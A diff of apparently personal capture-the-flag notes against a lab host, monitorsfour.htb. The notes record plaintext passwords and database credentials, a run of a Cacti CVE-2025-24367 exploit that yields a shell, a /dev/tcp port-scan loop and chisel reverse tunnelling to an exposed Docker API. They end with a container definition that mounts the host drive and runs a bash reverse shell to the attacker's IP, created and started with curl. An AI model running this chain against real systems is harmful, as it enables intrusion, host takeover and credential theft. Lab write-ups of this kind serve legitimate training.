@@ -1,4 +1,3 @@
-https://idocdown.com/app/articles/blogs/detail/17580
 wonderful1
 
 
@@ -29,7 +28,6 @@ DB_USER=monitorsdbuser
 DB_PASS=f37p2j8f4t0r
 
 
-https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py
 
 ┌──(ed㉿kali)-[/tmp/CVE-2025-24367-Cacti-PoC]
 └─$ python3 exploit.py  -u marcus -p wonderful1 -i 10.10.16.7 -l 8823 -url http://cacti.monitorsfour.htb
@@ -48,4 +46,42 @@ www-data@821fbd6a43fa:/$ for i in {1..65535}; do (echo > /dev/tcp/192.168.65.7/$
 
  curl 192.168.65.7 2375
 
- chisel client 10.10.16.7:8000 R:2375:192.168.57.7:2375
+
+
+└─$ chisel server  --reverse -p 8000 
+2025/12/12 20:20:57 server: Reverse tunnelling enabled
+2025/12/12 20:20:57 server: Fingerprint VhdBdJnK6+cs3EzgSiDIaT3LJpMVhKhK5hSyKXggl68=
+2025/12/12 20:20:57 server: Listening on http://0.0.0.0:8000
+2025/12/12 20:22:11 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0kali1)
+2025/12/12 20:22:11 server: session#1: tun: proxy#R:2375=>192.168.65.7:2375: Listening
+
+www-data@821fbd6a43fa:~/html$ ./chisel client 10.10.16.7:8000 R:2375:192.168.65.7:2375
+<sel client 10.10.16.7:8000 R:2375:192.168.65.7:2375
+2025/12/12 08:52:43 client: Connecting to ws://10.10.16.7:8000
+2025/12/12 08:52:44 client: Connected (Latency 88.465899ms)
+
+
+http://localhost:2375/images/json
+
+[{"Containers":1,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"],"SharedSize":-1,"Size":1277167255},
+
+{"Containers":1,"Created":1762791053,"Id":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","size":856},"RepoDigests":["docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"],"RepoTags":["docker_setup-mariadb:latest"],"SharedSize":-1,"Size":454269972},
+
+{"Containers":0,"Created":1759921496,"Id":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","Labels":null,"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","size":9218},"RepoDigests":["alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"],"RepoTags":["alpine:latest"],"SharedSize":-1,"Size":12794775}]
+
+//create docker json file, on target host
+{
+  "Images": "docker_setup-nginx-php:latest",
+  "Cmd" : ["/bin/bash", "-C", "bash -i >& /dev/tcp/10.10.16.7/8822 0>&1"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/host_root"]
+  }
+}
+
+curl -H 'Content-Type: application/json' -d @docker.json "http://192.168.65.7:2375/containers/create" -o response.jspn
+
+
+└─$ cat response.json 
+{"Id":"8bb3757e56e2e22f8876b6e0f3624bc249280829980ef0af304c2fe70f3938d8","Warnings":[]}
+
+└─$ curl -X POST "http://127.0.0.1:2375/containers/8bb3757e56e2e22f8876b6e0f3624bc249280829980ef0af304c2fe70f3938d8/start"
